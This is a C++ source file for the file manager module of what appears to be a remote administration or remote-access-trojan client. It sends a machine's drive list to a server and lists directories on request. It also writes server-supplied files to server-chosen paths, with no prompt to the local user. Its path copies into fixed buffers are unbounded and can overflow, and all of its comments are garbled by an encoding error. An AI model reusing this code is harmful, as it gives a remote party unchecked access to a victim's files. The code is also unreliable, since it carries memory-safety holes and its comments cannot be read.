#include "CClientFileManager.h"
#include "Common.h"

static __int64 __TransferFileLength = 0;  
CClientFileManager::CClientFileManager(_CIOCPClient* ClientObject):CManager(ClientObject)
{
	m_TransferMode = TRANSFER_MODE_NORMAL;
	SendClientVolumeList();
}

CClientFileManager::~CClientFileManager()
{
	printf("~CFileManager()\r\n");
}

void CClientFileManager::HandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_FILE_MANAGER_REQUIRE:
	{
		SendClientFileList((PBYTE)BufferData + 1);   //��һ���ֽ�����Ϣ �������·��
		break;
	}
	//�ӷ�������ͻ��˴�������
	case CLIENT_FILE_MANAGER_SEND_FILE_INFORMATION:
	{

		CreateReceivedFileInformation(BufferData + 1);
		break;
	}
	case CLIENT_FILE_MANAGER_FILE_DATA:
	{
		WriteReceivedFileData(BufferData + 1, BufferLength - 1);
		break;
	}

	case CLIENT_FILE_MANAGER_SET_TRANSFER_MODE:
	{

		SetTransferMode(BufferData + 1);
		break;
	}
	}
}

ULONG CClientFileManager::SendClientVolumeList()
{
	char	VolumeData[0x500] = { 0 };
	BYTE	BufferData[0x1000] = { 0 };
	char	FileSystemType[MAX_PATH] = { 0 };
	char* Travel = NULL;
	BufferData[0] = CLIENT_FILE_MANAGER_REPLY;


	GetLogicalDriveStrings(sizeof(VolumeData), VolumeData);

	//�����������Ϣ
	//0018F460  43 3A 5C 00 44 3A 5C 00 45 3A 5C 00 46 3A  C:\.D:\.E:\.F:
	//0018F46E  5C 00 47 3A 5C 00 48 3A 5C 00 4A 3A 5C 00  \.G:\.H:\.J:\.

	Travel = VolumeData;
	unsigned __int64	HardDiskAmount = 0;        //HardDisk
	unsigned __int64	HardDiskFreeSpace = 0;
	unsigned long		HardDiskAmountMB = 0;      // �ܴ�С
	unsigned long		HardDiskFreeSpaceMB = 0;   // ʣ��ռ�

	DWORD Offset = 0;
	for (Offset = 1; *Travel != '\0'; Travel += lstrlen(Travel) + 1)   //�����+1Ϊ�˹�\0
	{
		memset(FileSystemType, 0, sizeof(FileSystemType));  //�ļ�ϵͳ NTFS
		//�õ��ļ�ϵͳ��Ϣ����С
		GetVolumeInformation(Travel, NULL, 0, NULL, NULL, NULL, FileSystemType, MAX_PATH);
		ULONG	FileSystemTypeLength = lstrlen(FileSystemType) + 1;
		SHFILEINFO	v1;
		SHGetFileInfo(Travel, FILE_ATTRIBUTE_NORMAL, &v1,
			sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		ULONG HardDiskTypeNameLength = lstrlen(v1.szTypeName) + 1;
		//������̴�С
		if (Travel[0] != 'A' && Travel[0] != 'B'
			&& GetDiskFreeSpaceEx(Travel, (PULARGE_INTEGER)&HardDiskFreeSpace,
				(PULARGE_INTEGER)&HardDiskAmount, NULL))
		{
			HardDiskAmountMB = HardDiskAmount / 1024 / 1024;
			HardDiskFreeSpaceMB = HardDiskFreeSpace / 1024 / 1024;
		}
		else
		{
			HardDiskAmountMB = 0;
			HardDiskFreeSpaceMB = 0;
		}
		// ��ʼ��ֵ
		BufferData[Offset] = Travel[0];                       //�̷�
		BufferData[Offset + 1] = GetDriveType(Travel);        //������������
															  //���̿ռ�����ռȥ��8�ֽ�
		memcpy(BufferData + Offset + 2, &HardDiskAmountMB, sizeof(unsigned long));
		memcpy(BufferData + Offset + 6, &HardDiskFreeSpaceMB, sizeof(unsigned long));

		//0                       1  2       4  4
		//TOKEN_VOLUME_DEVICE_LISTC����������5030
		// ���̾��������������
		memcpy(BufferData + Offset + 10, v1.szTypeName, HardDiskTypeNameLength);
		memcpy(BufferData + Offset + 10 + HardDiskTypeNameLength, FileSystemType,
			FileSystemTypeLength);

		Offset += 10 + HardDiskTypeNameLength + FileSystemTypeLength;
	}
	return 	m_ClientObject->OnServerSending((char*)BufferData, Offset);
}

int CClientFileManager::SendClientFileList(PBYTE DirectoryFullPath)
{
	// ���ô��䷽ʽ
	m_TransferMode = TRANSFER_MODE_NORMAL;
	DWORD	Offset = 0; // λ��ָ��
	char* BufferData = NULL;
	ULONG   BufferLength = 1024 * 10; // �ȷ���10K�Ļ�����

	BufferData = (char*)LocalAlloc(LPTR, BufferLength);
	if (BufferData == NULL)
	{
		return 0;
	}
	char v1[MAX_PATH];
	wsprintf(v1, "%s\\*.*", DirectoryFullPath);
	//v1 = D:\\*.*

	HANDLE FileHandle = INVALID_HANDLE_VALUE;
	WIN32_FIND_DATA	v2;
	FileHandle = FindFirstFile(v1, &v2);

	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		BYTE IsToken = CLIENT_FILE_MANAGER_REPLY;

		if (BufferData != NULL)
		{

			LocalFree(BufferData);
			BufferData = NULL;
		}
		return m_ClientObject->OnServerSending((char*)&IsToken, 1);

	}


	BufferData[0] = CLIENT_FILE_MANAGER_REPLY;
	//1Ϊ���ݰ�ͷ����ռ�ֽ�,���ֵ
	Offset = 1;
	/*
	�ļ�����	1
	�ļ���		strlen(filename) + 1 ('\0')
	�ļ���С	4
	*/
	do
	{
		// ��̬��չ������
		if (Offset > (BufferLength - MAX_PATH * 2))
		{
			BufferLength += MAX_PATH * 2;
			BufferData = (char*)LocalReAlloc(BufferData,
				BufferLength, LMEM_ZEROINIT | LMEM_MOVEABLE);
		}
		char* FileName = v2.cFileName;
		if (strcmp(FileName, ".") == 0 || strcmp(FileName, "..") == 0)
		{
			continue;
		}
		//�ļ����� 1 �ֽ�

		//[Flag 1 HelloWorld\0��С ��С ʱ�� ʱ�� 
		//      0 1.txt\0 ��С ��С ʱ�� ʱ��]
		*(BufferData + Offset) = v2.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;   //1  0 
		Offset++;
		// �ļ��� lstrlen(pszFileName) + 1 �ֽ�
		ULONG FileNameLength = strlen(FileName);
		memcpy(BufferData + Offset, FileName, FileNameLength);
		Offset += FileNameLength;
		*(BufferData + Offset) = 0;
		Offset++;
		//�ļ���С 8 �ֽ�
		memcpy(BufferData + Offset, &v2.nFileSizeHigh, sizeof(DWORD));
		memcpy(BufferData + Offset + 4, &v2.nFileSizeLow, sizeof(DWORD));
		Offset += 8;
		// ������ʱ�� 8 �ֽ�
		memcpy(BufferData + Offset, &v2.ftLastWriteTime, sizeof(FILETIME));
		Offset += 8;
	} while (FindNextFile(FileHandle, &v2));
	ULONG ReturnLength = m_ClientObject->OnServerSending(BufferData, Offset);
	LocalFree(BufferData);
	FindClose(FileHandle);
	return ReturnLength;
}

VOID CClientFileManager::CreateReceivedFileInformation(LPBYTE BufferData)
{
	//	//[Flag 0001 0001 E:\1.txt\0 ]
	FILE_SIZE* v1 = (FILE_SIZE*)BufferData;
	// ���浱ǰ���ڲ������ļ���
	memset(m_FileFullPath, 0,
		sizeof(m_FileFullPath));
	strcpy(m_FileFullPath, (char*)BufferData + 8);  //�Ѿ�Խ����Ϣͷ��
													 //�����ļ�����
	__TransferFileLength =
		(v1->FileSizeHigh * (MAXDWORD + 1)) + v1->FileSizeLow;

	// �������Ŀ¼
	MakeSureDirectoryPathExists(m_FileFullPath);
	WIN32_FIND_DATA v2;
	HANDLE FileHandle = FindFirstFile(m_FileFullPath, &v2);
	//1 2 3         1  2 3
	if (FileHandle != INVALID_HANDLE_VALUE
		&& m_TransferMode != TRANSFER_MODE_COVER_ALL
		&& m_TransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		//�������ͬ���ļ�
		BYTE	IsToken[1];

		//����������δ���
		IsToken[0] = CLIENT_FILE_MANAGER_TRANSFER_MODE_REQUIRE;
		m_ClientObject->OnServerSending((char*)&IsToken, sizeof(IsToken));
	}
	else
	{
		GetServerFileData();                      //���û����ͬ���ļ��ͻ�ִ�е�����
	}
	FindClose(FileHandle);
}

BOOL CClientFileManager::MakeSureDirectoryPathExists(char* DirectoryFullPath)
{
	char* Travel = NULL;
	char* BufferData = NULL;
	DWORD DirectoryAttributes;
	__try
	{
		BufferData = (char*)malloc(sizeof(char) * (strlen(DirectoryFullPath) + 1));

		if (BufferData == NULL)
		{
			return FALSE;
		}

		strcpy(BufferData, DirectoryFullPath);

		Travel = BufferData;


		if (*(Travel + 1) == ':')
		{
			Travel++;
			Travel++;
			if (*Travel && (*Travel == '\\'))
			{
				Travel++;
			}
		}
		//���Ŀ¼
		while (*Travel)
		{
			if (*Travel == '\\')
			{
				*Travel = '\0';
				DirectoryAttributes = GetFileAttributes(BufferData);   //�鿴�Ƿ��Ƿ�Ŀ¼  Ŀ¼������
				if (DirectoryAttributes == 0xffffffff)
				{
					if (!CreateDirectory(BufferData, NULL))
					{
						if (GetLastError() != ERROR_ALREADY_EXISTS)
						{
							free(BufferData);
							return FALSE;
						}
					}
				}
				else
				{
					if ((DirectoryAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
					{
						free(BufferData);
						BufferData = NULL;
						return FALSE;
					}
				}

				*Travel = '\\';
			}

			Travel = CharNext(Travel);
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		if (BufferData != NULL)
		{
			free(BufferData);

			BufferData = NULL;
		}

		return FALSE;
	}

	if (BufferData != NULL)
	{
		free(BufferData);
		BufferData = NULL;
	}
	return TRUE;
}

VOID CClientFileManager::SetTransferMode(LPBYTE BufferData)
{
	memcpy(&m_TransferMode, BufferData, sizeof(m_TransferMode));
	GetServerFileData();
}

VOID CClientFileManager::GetServerFileData()
{
	int	TransferMode;
	switch (m_TransferMode)   //���û����ͬ�������ǲ������Case�е�
	{
	case TRANSFER_MODE_COVER_ALL:
		TransferMode = TRANSFER_MODE_COVER;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		TransferMode = TRANSFER_MODE_JUMP;   //CreateFile��always open����eixt��
		break;
	default:
		TransferMode = m_TransferMode;   //1.  2 3
	}

	WIN32_FIND_DATA v1;
	HANDLE FileHandle = FindFirstFile(m_FileFullPath, &v1);

	//1�ֽ�Token,���ֽ�ƫ�Ƹ���λ�����ֽ�ƫ�Ƶ���λ
	BYTE	IsToken[9] = { 0 };
	DWORD	CreationDisposition; //�ļ��򿪷�ʽ 
	memset(IsToken, 0, sizeof(IsToken));
	IsToken[0] = CLIENT_FILE_MANAGER_FILE_DATA_CONTINUE;
	// �ļ��Ѿ�����
	if (FileHandle != INVALID_HANDLE_VALUE)
	{

		//����
		if (TransferMode == TRANSFER_MODE_COVER)
		{
			//ƫ����0
			memset(IsToken + 1, 0, 8);//0000 0000
									 // ���´���
			CreationDisposition = CREATE_ALWAYS;    //���и���   

		}
		//������һ��
		else if (TransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD v1 = -1;  //0000 -1
			memcpy(IsToken + 5, &v1, 4);
			CreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{

		memset(IsToken + 1, 0, 8);  //0000 0000              //û����ͬ���ļ����ߵ�����
								   // ���´���
		CreationDisposition = CREATE_ALWAYS;    //����һ���µ��ļ�
	}
	FindClose(FileHandle);

	FileHandle =
		CreateFile
		(
			m_FileFullPath,
			GENERIC_WRITE,
			FILE_SHARE_WRITE,
			NULL,
			CreationDisposition,  //
			FILE_ATTRIBUTE_NORMAL,
			0
		);
	//��Ҫ������
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		__TransferFileLength = 0;
		return;
	}
	CloseHandle(FileHandle);


	m_ClientObject->OnServerSending((char*)&IsToken, sizeof(IsToken));
}

VOID CClientFileManager::WriteReceivedFileData(LPBYTE BufferData, ULONG BufferLength)
{
	BYTE* Travel;
	DWORD	NumberOfBytesToWrite = 0;
	DWORD	NumberOfBytesWirte = 0;
	int		v3 = 9; //1 + 4 + 4  ���ݰ�ͷ����С��Ϊ�̶���9
	FILE_SIZE* v1;
	// �õ����ݵ�ƫ��
	Travel = BufferData + 8;
	v1 = (FILE_SIZE*)BufferData;
	// �õ��������ļ��е�ƫ��
	LONG	FileSizeHigh = v1->FileSizeHigh;
	LONG	FileSizeLow = v1->FileSizeLow;
	NumberOfBytesToWrite = BufferLength - 8;
	HANDLE	FileHandle =
		CreateFile
		(
			m_FileFullPath,
			GENERIC_WRITE,
			FILE_SHARE_WRITE,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			0
		);
	SetFilePointer(FileHandle, FileSizeLow, &FileSizeHigh, FILE_BEGIN);
	// д���ļ�
	WriteFile
	(
		FileHandle,
		Travel,
		NumberOfBytesToWrite,
		&NumberOfBytesWirte,
		NULL
	);
	CloseHandle(FileHandle);
	BYTE	IsToken[9];
	IsToken[0] = CLIENT_FILE_MANAGER_FILE_DATA_CONTINUE;
	FileSizeLow += NumberOfBytesWirte;
	memcpy(IsToken + 1, &FileSizeHigh, sizeof(FileSizeHigh));
	memcpy(IsToken + 5, &FileSizeLow, sizeof(FileSizeLow));
	m_ClientObject->OnServerSending((char*)&IsToken, sizeof(IsToken));
}


